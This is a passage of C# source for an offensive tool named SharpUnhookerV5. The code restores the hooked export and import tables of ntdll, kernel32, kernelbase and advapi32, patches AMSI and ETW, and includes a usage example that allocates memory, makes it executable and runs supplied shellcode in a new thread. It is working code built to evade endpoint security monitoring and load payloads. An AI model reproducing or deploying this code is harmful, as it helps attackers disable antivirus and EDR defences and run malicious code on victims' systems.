            Int32 FunctionRVAOriginal = Marshal.ReadInt32((IntPtr)(OriginalModuleBase.ToInt64() + FunctionsRVAOriginal + (4 * (FunctionOrdinal - OrdinalBase))));
            if (FunctionRVA != FunctionRVAOriginal) {
                try { Marshal.WriteInt32(((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase)))), FunctionRVAOriginal); }catch {
                    Console.WriteLine("[-] Failed to rewrite the EAT of {0} with RVA of {1} and function ordinal of {2}", FunctionName, FunctionRVA.ToString("X4"), FunctionOrdinal);
                    continue;
                }
            }
        }

        Marshal.FreeHGlobal(OriginalModuleBase);
        uint newProtect = 0;
        Dynavoke.NtProtectVirtualMemory((IntPtr)(-1), ref TargetPtr, ref TargetSize, oldProtect, ref newProtect);
        Console.WriteLine("[+++] {0} EXPORTS ARE CLEANSED!", ModuleName.ToUpper());
    }

    public static void IATUnhooker(string ModuleName) {
        IntPtr PEBaseAddress = IntPtr.Zero;
        try { PEBaseAddress = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => ModuleName.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().BaseAddress); }catch {}
        if (PEBaseAddress == IntPtr.Zero) {
            Console.WriteLine("[-] Module is not loaded, Skipping...");
            return;
        }

        // parse the initial header of the PE
        IntPtr OptHeader = PEBaseAddress + Marshal.ReadInt32((IntPtr)(PEBaseAddress + 0x3C)) + 0x18;
        IntPtr SizeOfHeaders = (IntPtr)Marshal.ReadInt32(OptHeader + 60);
        Int16 Magic = Marshal.ReadInt16(OptHeader + 0);
        IntPtr DataDirectoryAddr = IntPtr.Zero;        
        if (Magic == 0x010b) {
            DataDirectoryAddr = (IntPtr)(OptHeader.ToInt64() + (long)0x60); // PE32, 0x60 = 96 
        }
        else {
            DataDirectoryAddr = (IntPtr)(OptHeader.ToInt64() + (long)0x70); // PE32+, 0x70 = 112
        }

        // get the base address of all of the IAT array, and get the whole size of the IAT array
        IntPtr IATBaseAddress = (IntPtr)((long)(PEBaseAddress.ToInt64() + (long)Marshal.ReadInt32(DataDirectoryAddr + 96)));
        IntPtr IATSize = (IntPtr)Marshal.ReadInt32((IntPtr)(DataDirectoryAddr.ToInt64() + (long)96 + (long)4));

        // check if current PE have any import(s)
        if ((int)IATSize == 0) {
            Console.WriteLine("[-] Module doesnt have any imports, Skipping...");
            return;
        }

        // change memory protection of the IAT to RW
        uint oldProtect = 0;
        if (!Dynavoke.NtProtectVirtualMemory((IntPtr)(-1), ref IATBaseAddress, ref IATSize, 0x04, ref oldProtect)) {
            Console.WriteLine("[-] Failed to change IAT's memory protection to RW!");
            return;
        }

        // get import table address
        int ImportTableSize = Marshal.ReadInt32((IntPtr)(DataDirectoryAddr.ToInt64() + (long)12)); //  IMPORT TABLE Size = byte 8 + 4 (4 is the size of the RVA) from the start of the data directory
        IntPtr ImportTableAddr = (IntPtr)(PEBaseAddress.ToInt64() + (long)Marshal.ReadInt32((IntPtr)DataDirectoryAddr + 8)); // IMPORT TABLE RVA = byte 8 from the start of the data directory
        int ImportTableCount = (ImportTableSize / 20);

        // iterates through the import tables
        for (int i = 0; i < (ImportTableCount - 1); i++) {
            IntPtr CurrentImportTableAddr = (IntPtr)(ImportTableAddr.ToInt64() + (long)(20 * i));

            string CurrentImportTableName = Marshal.PtrToStringAnsi((IntPtr)(PEBaseAddress.ToInt64() + (long)Marshal.ReadInt32(CurrentImportTableAddr + 12))).Trim(); // Name RVA = byte 12 from start of the current import table
            if (CurrentImportTableName.StartsWith("api-ms-win")) { 
                continue;
            }

            // get IAT (FirstThunk) and ILT (OriginalFirstThunk) address from Import Table
            IntPtr CurrentImportIATAddr = (IntPtr)(PEBaseAddress.ToInt64() + (long)Marshal.ReadInt32((IntPtr)(CurrentImportTableAddr.ToInt64() + (long)16))); // IAT RVA = byte 16 from the start of the current import table
            IntPtr CurrentImportILTAddr = (IntPtr)(PEBaseAddress.ToInt64() + (long)Marshal.ReadInt32(CurrentImportTableAddr)); // ILT RVA = byte 0 from the start of the current import table

            // get the imported module base address
            IntPtr ImportedModuleAddr = IntPtr.Zero;
            try{ ImportedModuleAddr = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => CurrentImportTableName.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().BaseAddress); }catch{}
            if (ImportedModuleAddr == IntPtr.Zero) { // check if its loaded or not
                continue;
            }

            // loop through the functions
            for (int z = 0; z < 999999; z++) {
                IntPtr CurrentFunctionILTAddr = (IntPtr)(CurrentImportILTAddr.ToInt64() + (long)(IntPtr.Size * z));
                IntPtr CurrentFunctionIATAddr = (IntPtr)(CurrentImportIATAddr.ToInt64()  + (long)(IntPtr.Size * z));

                // check if current ILT is empty
                if (Marshal.ReadIntPtr(CurrentFunctionILTAddr) == IntPtr.Zero) { // the ILT is null, which means we're already on the end of the table
                    break;
                }

                IntPtr CurrentFunctionNameAddr = (IntPtr)(PEBaseAddress.ToInt64() + (long)Marshal.ReadIntPtr(CurrentFunctionILTAddr)); // reading a union structure for getting the name RVA
                string CurrentFunctionName = Marshal.PtrToStringAnsi(CurrentFunctionNameAddr + 2).Trim(); // reading the Name field on the Name table
                
                if (String.IsNullOrEmpty(CurrentFunctionName)) { 
                    continue; // used to silence ntdll's RtlDispatchApc ordinal imported by kernelbase
                }
                if (IsBlacklistedFunction(CurrentFunctionName)) {
                    continue;
                }

                // get current function real address
                IntPtr CurrentFunctionRealAddr = Dynavoke.GetExportAddress(ImportedModuleAddr, CurrentFunctionName);
                if (CurrentFunctionRealAddr == IntPtr.Zero) {
                    Console.WriteLine("[-] Failed to find function export address of {0} from {1}! CurrentFunctionNameAddr = {2}", CurrentFunctionName, CurrentImportTableName, CurrentFunctionNameAddr.ToString("X4"));
                    continue;
                }

                // compare the address
                if (Marshal.ReadIntPtr(CurrentFunctionIATAddr) != CurrentFunctionRealAddr) {
                    try { Marshal.WriteIntPtr(CurrentFunctionIATAddr, CurrentFunctionRealAddr); }catch (Exception e){
                        Console.WriteLine("[-] Failed to rewrite IAT of {0}! Reason : {1}", CurrentFunctionName, e.Message);
                    }
                }
            }
        }

        // revert IAT's memory protection
        uint newProtect = 0;
        Dynavoke.NtProtectVirtualMemory((IntPtr)(-1), ref IATBaseAddress, ref IATSize, oldProtect, ref newProtect);
        Console.WriteLine("[+++] {0} IMPORTS ARE CLEANSED!", ModuleName.ToUpper());
    }

    public static void Main() {
		Console.WriteLine("[------------------------------------------]");
    	Console.WriteLine("[SharpUnhookerV5 - C# Based WinAPI Unhooker]");
    	Console.WriteLine("[         Written By GetRektBoy724         ]");
        Console.WriteLine("[------------------------------------------]");
        string[] ListOfDLLToUnhook = { "ntdll.dll", "kernel32.dll", "kernelbase.dll", "advapi32.dll" };
        for (int i = 0; i < ListOfDLLToUnhook.Length; i++) {
            JMPUnhooker(ListOfDLLToUnhook[i]);
            EATUnhooker(ListOfDLLToUnhook[i]);
            if (ListOfDLLToUnhook[i] != "ntdll.dll") {
                IATUnhooker(ListOfDLLToUnhook[i]); // NTDLL have no imports ;)
            }
        }
    	PatchAMSIAndETW.Run();
        Console.WriteLine("[------------------------------------------]");
    }
}

public class SUUsageExample {
    [Flags]
    public enum AllocationType : ulong
    {
        Commit = 0x1000,
        Reserve = 0x2000,
        Decommit = 0x4000,
        Release = 0x8000,
        Reset = 0x80000,
        Physical = 0x400000,
        TopDown = 0x100000,
        WriteWatch = 0x200000,
        LargePages = 0x20000000
    };

    [Flags]
    public enum ACCESS_MASK : uint
    {
        DELETE = 0x00010000,
        READ_CONTROL = 0x00020000,
        WRITE_DAC = 0x00040000,
        WRITE_OWNER = 0x00080000,
        SYNCHRONIZE = 0x00100000,
        STANDARD_RIGHTS_REQUIRED = 0x000F0000,
        STANDARD_RIGHTS_READ = 0x00020000,
        STANDARD_RIGHTS_WRITE = 0x00020000,
        STANDARD_RIGHTS_EXECUTE = 0x00020000,
        STANDARD_RIGHTS_ALL = 0x001F0000,
        SPECIFIC_RIGHTS_ALL = 0x0000FFF,
        ACCESS_SYSTEM_SECURITY = 0x01000000,
        MAXIMUM_ALLOWED = 0x02000000,
        GENERIC_READ = 0x80000000,
        GENERIC_WRITE = 0x40000000,
        GENERIC_EXECUTE = 0x20000000,
        GENERIC_ALL = 0x10000000,
        DESKTOP_READOBJECTS = 0x00000001,
        DESKTOP_CREATEWINDOW = 0x00000002,
        DESKTOP_CREATEMENU = 0x00000004,
        DESKTOP_HOOKCONTROL = 0x00000008,
        DESKTOP_JOURNALRECORD = 0x00000010,
        DESKTOP_JOURNALPLAYBACK = 0x00000020,
        DESKTOP_ENUMERATE = 0x00000040,
        DESKTOP_WRITEOBJECTS = 0x00000080,
        DESKTOP_SWITCHDESKTOP = 0x00000100,
        WINSTA_ENUMDESKTOPS = 0x00000001,
        WINSTA_READATTRIBUTES = 0x00000002,
        WINSTA_ACCESSCLIPBOARD = 0x00000004,
        WINSTA_CREATEDESKTOP = 0x00000008,
        WINSTA_WRITEATTRIBUTES = 0x00000010,
        WINSTA_ACCESSGLOBALATOMS = 0x00000020,
        WINSTA_EXITWINDOWS = 0x00000040,
        WINSTA_ENUMERATE = 0x00000100,
        WINSTA_READSCREEN = 0x00000200,
        WINSTA_ALL_ACCESS = 0x0000037F,

        SECTION_ALL_ACCESS = 0x10000000,
        SECTION_QUERY = 0x0001,
        SECTION_MAP_WRITE = 0x0002,
        SECTION_MAP_READ = 0x0004,
        SECTION_MAP_EXECUTE = 0x0008,
        SECTION_EXTEND_SIZE = 0x0010
    };

    public enum NTSTATUS : uint {
            // Success
            Success = 0x00000000,
            Wait0 = 0x00000000,
            Wait1 = 0x00000001,
            Wait2 = 0x00000002,
            Wait3 = 0x00000003,
            Wait63 = 0x0000003f,
            Abandoned = 0x00000080,
            AbandonedWait0 = 0x00000080,
            AbandonedWait1 = 0x00000081,
            AbandonedWait2 = 0x00000082,
            AbandonedWait3 = 0x00000083,
            AbandonedWait63 = 0x000000bf,
            UserApc = 0x000000c0,
            KernelApc = 0x00000100,
            Alerted = 0x00000101,
            Timeout = 0x00000102,
            Pending = 0x00000103,
            Reparse = 0x00000104,
            MoreEntries = 0x00000105,
            NotAllAssigned = 0x00000106,
            SomeNotMapped = 0x00000107,
            OpLockBreakInProgress = 0x00000108,
            VolumeMounted = 0x00000109,
            RxActCommitted = 0x0000010a,
            NotifyCleanup = 0x0000010b,
            NotifyEnumDir = 0x0000010c,
            NoQuotasForAccount = 0x0000010d,
            PrimaryTransportConnectFailed = 0x0000010e,
            PageFaultTransition = 0x00000110,
            PageFaultDemandZero = 0x00000111,
            PageFaultCopyOnWrite = 0x00000112,
            PageFaultGuardPage = 0x00000113,
            PageFaultPagingFile = 0x00000114,
            CrashDump = 0x00000116,
            ReparseObject = 0x00000118,
            NothingToTerminate = 0x00000122,
            ProcessNotInJob = 0x00000123,
            ProcessInJob = 0x00000124,
            ProcessCloned = 0x00000129,
            FileLockedWithOnlyReaders = 0x0000012a,
            FileLockedWithWriters = 0x0000012b,

            // Informational
            Informational = 0x40000000,
            ObjectNameExists = 0x40000000,
            ThreadWasSuspended = 0x40000001,
            WorkingSetLimitRange = 0x40000002,
            ImageNotAtBase = 0x40000003,
            RegistryRecovered = 0x40000009,

            // Warning
            Warning = 0x80000000,
            GuardPageViolation = 0x80000001,
            DatatypeMisalignment = 0x80000002,
            Breakpoint = 0x80000003,
            SingleStep = 0x80000004,
            BufferOverflow = 0x80000005,
            NoMoreFiles = 0x80000006,
            HandlesClosed = 0x8000000a,
            PartialCopy = 0x8000000d,
            DeviceBusy = 0x80000011,
            InvalidEaName = 0x80000013,
            EaListInconsistent = 0x80000014,
            NoMoreEntries = 0x8000001a,
            LongJump = 0x80000026,
            DllMightBeInsecure = 0x8000002b,

            // Error
            Error = 0xc0000000,
            Unsuccessful = 0xc0000001,
            NotImplemented = 0xc0000002,
            InvalidInfoClass = 0xc0000003,
            InfoLengthMismatch = 0xc0000004,
            AccessViolation = 0xc0000005,
            InPageError = 0xc0000006,
            PagefileQuota = 0xc0000007,
            InvalRunPEdle = 0xc0000008,
            BadInitialStack = 0xc0000009,
            BadInitialPc = 0xc000000a,
            InvalidCid = 0xc000000b,
            TimerNotCanceled = 0xc000000c,
            InvalidParameter = 0xc000000d,
            NoSuchDevice = 0xc000000e,
            NoSuchFile = 0xc000000f,
            InvalidDeviceRequest = 0xc0000010,
            EndOfFile = 0xc0000011,
            WrongVolume = 0xc0000012,
            NoMediaInDevice = 0xc0000013,
            NoMemory = 0xc0000017,
            ConflictingAddresses = 0xc0000018,
            NotMappedView = 0xc0000019,
            UnableToFreeVm = 0xc000001a,
            UnableToDeleteSection = 0xc000001b,
            IllegalInstruction = 0xc000001d,
            AlreadyCommitted = 0xc0000021,
            AccessDenied = 0xc0000022,
            BufferTooSmall = 0xc0000023,
            ObjectTypeMismatch = 0xc0000024,
            NonContinuableException = 0xc0000025,
            BadStack = 0xc0000028,
            NotLocked = 0xc000002a,
            NotCommitted = 0xc000002d,
            InvalidParameterMix = 0xc0000030,
            ObjectNameInvalid = 0xc0000033,
            ObjectNameNotFound = 0xc0000034,
            ObjectNameCollision = 0xc0000035,
            ObjectPathInvalid = 0xc0000039,
            ObjectPathNotFound = 0xc000003a,
            ObjectPathSyntaxBad = 0xc000003b,
            DataOverrun = 0xc000003c,
            DataLate = 0xc000003d,
            DataError = 0xc000003e,
            CrcError = 0xc000003f,
            SectionTooBig = 0xc0000040,
            PortConnectionRefused = 0xc0000041,
            InvalidPortHandle = 0xc0000042,
            SharingViolation = 0xc0000043,
            QuotaExceeded = 0xc0000044,
            InvalidPageProtection = 0xc0000045,
            MutantNotOwned = 0xc0000046,
            SemaphoreLimitExceeded = 0xc0000047,
            PortAlreadySet = 0xc0000048,
            SectionNotImage = 0xc0000049,
            SuspendCountExceeded = 0xc000004a,
            ThreadIsTerminating = 0xc000004b,
            BadWorkingSetLimit = 0xc000004c,
            IncompatibleFileMap = 0xc000004d,
            SectionProtection = 0xc000004e,
            EasNotSupported = 0xc000004f,
            EaTooLarge = 0xc0000050,
            NonExistentEaEntry = 0xc0000051,
            NoEasOnFile = 0xc0000052,
            EaCorruptError = 0xc0000053,
            FileLockConflict = 0xc0000054,
            LockNotGranted = 0xc0000055,
            DeletePending = 0xc0000056,
            CtlFileNotSupported = 0xc0000057,
            UnknownRevision = 0xc0000058,
            RevisionMismatch = 0xc0000059,
            InvalidOwner = 0xc000005a,
            InvalidPrimaryGroup = 0xc000005b,
            NoImpersonationToken = 0xc000005c,
            CantDisableMandatory = 0xc000005d,
            NoLogonServers = 0xc000005e,
            NoSuchLogonSession = 0xc000005f,
            NoSuchPrivilege = 0xc0000060,
            PrivilegeNotHeld = 0xc0000061,
            InvalidAccountName = 0xc0000062,
            UserExists = 0xc0000063,
            NoSuchUser = 0xc0000064,
            GroupExists = 0xc0000065,
            NoSuchGroup = 0xc0000066,
            MemberInGroup = 0xc0000067,
            MemberNotInGroup = 0xc0000068,
            LastAdmin = 0xc0000069,
            WrongPassword = 0xc000006a,
            IllFormedPassword = 0xc000006b,
            PasswordRestriction = 0xc000006c,
            LogonFailure = 0xc000006d,
            AccountRestriction = 0xc000006e,
            InvalidLogonHours = 0xc000006f,
            InvalidWorkstation = 0xc0000070,
            PasswordExpired = 0xc0000071,
            AccountDisabled = 0xc0000072,
            NoneMapped = 0xc0000073,
            TooManyLuidsRequested = 0xc0000074,
            LuidsExhausted = 0xc0000075,
            InvalidSubAuthority = 0xc0000076,
            InvalidAcl = 0xc0000077,
            InvalidSid = 0xc0000078,
            InvalidSecurityDescr = 0xc0000079,
            ProcedureNotFound = 0xc000007a,
            InvalidImageFormat = 0xc000007b,
            NoToken = 0xc000007c,
            BadInheritanceAcl = 0xc000007d,
            RangeNotLocked = 0xc000007e,
            DiskFull = 0xc000007f,
            ServerDisabled = 0xc0000080,
            ServerNotDisabled = 0xc0000081,
            TooManyGuidsRequested = 0xc0000082,
            GuidsExhausted = 0xc0000083,
            InvalidIdAuthority = 0xc0000084,
            AgentsExhausted = 0xc0000085,
            InvalidVolumeLabel = 0xc0000086,
            SectionNotExtended = 0xc0000087,
            NotMappedData = 0xc0000088,
            ResourceDataNotFound = 0xc0000089,
            ResourceTypeNotFound = 0xc000008a,
            ResourceNameNotFound = 0xc000008b,
            ArrayBoundsExceeded = 0xc000008c,
            FloatDenormalOperand = 0xc000008d,
            FloatDivideByZero = 0xc000008e,
            FloatInexactResult = 0xc000008f,
            FloatInvalidOperation = 0xc0000090,
            FloatOverflow = 0xc0000091,
            FloatStackCheck = 0xc0000092,
            FloatUnderflow = 0xc0000093,
            IntegerDivideByZero = 0xc0000094,
            IntegerOverflow = 0xc0000095,
            PrivilegedInstruction = 0xc0000096,
            TooManyPagingFiles = 0xc0000097,
            FileInvalid = 0xc0000098,
            InsufficientResources = 0xc000009a,
            InstanceNotAvailable = 0xc00000ab,
            PipeNotAvailable = 0xc00000ac,
            InvalidPipeState = 0xc00000ad,
            PipeBusy = 0xc00000ae,
            IllegalFunction = 0xc00000af,
            PipeDisconnected = 0xc00000b0,
            PipeClosing = 0xc00000b1,
            PipeConnected = 0xc00000b2,
            PipeListening = 0xc00000b3,
            InvalidReadMode = 0xc00000b4,
            IoTimeout = 0xc00000b5,
            FileForcedClosed = 0xc00000b6,
            ProfilingNotStarted = 0xc00000b7,
            ProfilingNotStopped = 0xc00000b8,
            NotSameDevice = 0xc00000d4,
            FileRenamed = 0xc00000d5,
            CantWait = 0xc00000d8,
            PipeEmpty = 0xc00000d9,
            CantTerminateSelf = 0xc00000db,
            InternalError = 0xc00000e5,
            InvalidParameter1 = 0xc00000ef,
            InvalidParameter2 = 0xc00000f0,
            InvalidParameter3 = 0xc00000f1,
            InvalidParameter4 = 0xc00000f2,
            InvalidParameter5 = 0xc00000f3,
            InvalidParameter6 = 0xc00000f4,
            InvalidParameter7 = 0xc00000f5,
            InvalidParameter8 = 0xc00000f6,
            InvalidParameter9 = 0xc00000f7,
            InvalidParameter10 = 0xc00000f8,
            InvalidParameter11 = 0xc00000f9,
            InvalidParameter12 = 0xc00000fa,
            ProcessIsTerminating = 0xc000010a,
            MappedFileSizeZero = 0xc000011e,
            TooManyOpenedFiles = 0xc000011f,
            Cancelled = 0xc0000120,
            CannotDelete = 0xc0000121,
            InvalidComputerName = 0xc0000122,
            FileDeleted = 0xc0000123,
            SpecialAccount = 0xc0000124,
            SpecialGroup = 0xc0000125,
            SpecialUser = 0xc0000126,
            MembersPrimaryGroup = 0xc0000127,
            FileClosed = 0xc0000128,
            TooManyThreads = 0xc0000129,
            ThreadNotInProcess = 0xc000012a,
            TokenAlreadyInUse = 0xc000012b,
            PagefileQuotaExceeded = 0xc000012c,
            CommitmentLimit = 0xc000012d,
            InvalidImageLeFormat = 0xc000012e,
            InvalidImageNotMz = 0xc000012f,
            InvalidImageProtect = 0xc0000130,
            InvalidImageWin16 = 0xc0000131,
            LogonServer = 0xc0000132,
            DifferenceAtDc = 0xc0000133,
            SynchronizationRequired = 0xc0000134,
            DllNotFound = 0xc0000135,
            IoPrivilegeFailed = 0xc0000137,
            OrdinalNotFound = 0xc0000138,
            EntryPointNotFound = 0xc0000139,
            ControlCExit = 0xc000013a,
            InvalidAddress = 0xc0000141,
            PortNotSet = 0xc0000353,
            DebuggerInactive = 0xc0000354,
            CallbackBypass = 0xc0000503,
            PortClosed = 0xc0000700,
            MessageLost = 0xc0000701,
            InvalidMessage = 0xc0000702,
            RequestCanceled = 0xc0000703,
            RecursiveDispatch = 0xc0000704,
            LpcReceiveBufferExpected = 0xc0000705,
            LpcInvalidConnectionUsage = 0xc0000706,
            LpcRequestsNotAllowed = 0xc0000707,
            ResourceInUse = 0xc0000708,
            ProcessIsProtected = 0xc0000712,
            VolumeDirty = 0xc0000806,
            FileCheckedOut = 0xc0000901,
            CheckOutRequired = 0xc0000902,
            BadFileType = 0xc0000903,
            FileTooLarge = 0xc0000904,
            FormsAuthRequired = 0xc0000905,
            VirusInfected = 0xc0000906,
            VirusDeleted = 0xc0000907,
            TransactionalConflict = 0xc0190001,
            InvalidTransaction = 0xc0190002,
            TransactionNotActive = 0xc0190003,
            TmInitializationFailed = 0xc0190004,
            RmNotActive = 0xc0190005,
            RmMetadataCorrupt = 0xc0190006,
            TransactionNotJoined = 0xc0190007,
            DirectoryNotRm = 0xc0190008,
            CouldNotResizeLog = 0xc0190009,
            TransactionsUnsupportedRemote = 0xc019000a,
            LogResizeInvalidSize = 0xc019000b,
            RemoteFileVersionMismatch = 0xc019000c,
            CrmProtocolAlreadyExists = 0xc019000f,
            TransactionPropagationFailed = 0xc0190010,
            CrmProtocolNotFound = 0xc0190011,
            TransactionSuperiorExists = 0xc0190012,
            TransactionRequestNotValid = 0xc0190013,
            TransactionNotRequested = 0xc0190014,
            TransactionAlreadyAborted = 0xc0190015,
            TransactionAlreadyCommitted = 0xc0190016,
            TransactionInvalidMarshallBuffer = 0xc0190017,
            CurrentTransactionNotValid = 0xc0190018,
            LogGrowthFailed = 0xc0190019,
            ObjectNoLongerExists = 0xc0190021,
            StreamMiniversionNotFound = 0xc0190022,
            StreamMiniversionNotValid = 0xc0190023,
            MiniversionInaccessibleFromSpecifiedTransaction = 0xc0190024,
            CantOpenMiniversionWithModifyIntent = 0xc0190025,
            CantCreateMoreStreamMiniversions = 0xc0190026,
            HandleNoLongerValid = 0xc0190028,
            NoTxfMetadata = 0xc0190029,
            LogCorruptionDetected = 0xc0190030,
            CantRecoverWithHandleOpen = 0xc0190031,
            RmDisconnected = 0xc0190032,
            EnlistmentNotSuperior = 0xc0190033,
            RecoveryNotNeeded = 0xc0190034,
            RmAlreadyStarted = 0xc0190035,
            FileIdentityNotPersistent = 0xc0190036,
            CantBreakTransactionalDependency = 0xc0190037,
            CantCrossRmBoundary = 0xc0190038,
            TxfDirNotEmpty = 0xc0190039,
            IndoubtTransactionsExist = 0xc019003a,
            TmVolatile = 0xc019003b,
            RollbackTimerExpired = 0xc019003c,
            TxfAttributeCorrupt = 0xc019003d,
            EfsNotAllowedInTransaction = 0xc019003e,
            TransactionalOpenNotAllowed = 0xc019003f,
            TransactedMappingUnsupportedRemote = 0xc0190040,
            TxfMetadataAlreadyPresent = 0xc0190041,
            TransactionScopeCallbacksNotSet = 0xc0190042,
            TransactionRequiredPromotion = 0xc0190043,
            CannotExecuteFileInTransaction = 0xc0190044,
            TransactionsNotFrozen = 0xc0190045,

            MaximumNtStatus = 0xffffffff
        }

    [DllImport("ntdll.dll", SetLastError=true)]
    static extern NTSTATUS NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, UInt32 AllocationType, UInt32 Protect);

    [DllImport("ntdll.dll", SetLastError=true)]
    static extern NTSTATUS NtCreateThreadEx(out IntPtr threadHandle, ACCESS_MASK desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool inCreateSuspended, Int32 stackZeroBits, Int32 sizeOfStack, Int32 maximumStackSize, IntPtr attributeList);

    [DllImport("ntdll.dll", SetLastError=true)]
    static extern NTSTATUS NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, UInt32 NewAccessProtection, ref UInt32 OldAccessProtection);

    public static void UsageExample(byte[] ShellcodeBytes) {
        SharpUnhooker.Main();
        IntPtr ProcessHandle = new IntPtr(-1); // pseudo-handle for current process
        IntPtr ShellcodeBytesLength = new IntPtr(ShellcodeBytes.Length);
        IntPtr AllocationAddress = new IntPtr();
        IntPtr ZeroBitsThatZero = IntPtr.Zero;
        UInt32 AllocationTypeUsed = (UInt32)AllocationType.Commit | (UInt32)AllocationType.Reserve;
        Console.WriteLine("[*] Allocating memory...");
        NtAllocateVirtualMemory(ProcessHandle, ref AllocationAddress, ZeroBitsThatZero, ref ShellcodeBytesLength, AllocationTypeUsed, 0x04);
        Console.WriteLine("[*] Copying Shellcode...");
        Marshal.Copy(ShellcodeBytes, 0, AllocationAddress, ShellcodeBytes.Length);
        Console.WriteLine("[*] Changing memory protection setting...");
        UInt32 newProtect = 0;
        NtProtectVirtualMemory(ProcessHandle, ref AllocationAddress, ref ShellcodeBytesLength, 0x20, ref newProtect);
        IntPtr threadHandle = new IntPtr(0);
        ACCESS_MASK desiredAccess = ACCESS_MASK.SPECIFIC_RIGHTS_ALL | ACCESS_MASK.STANDARD_RIGHTS_ALL; // logical OR the access rights together
        IntPtr pObjectAttributes = new IntPtr(0);
        IntPtr lpParameter = new IntPtr(0);
        bool bCreateSuspended = false;
        int stackZeroBits = 0;
        int sizeOfStackCommit = 0xFFFF;
        int sizeOfStackReserve = 0xFFFF;
        IntPtr pBytesBuffer = new IntPtr(0);
        // create new thread
        Console.WriteLine("[*] Creating new thread to execute the Shellcode...");
        NtCreateThreadEx(out threadHandle, desiredAccess, pObjectAttributes, ProcessHandle, AllocationAddress, lpParameter, bCreateSuspended, stackZeroBits, sizeOfStackCommit, sizeOfStackReserve, pBytesBuffer);
        Console.WriteLine("[+] Thread created with handle {0}! Sh3llc0d3 executed!", threadHandle.ToString("X4"));
    }
}
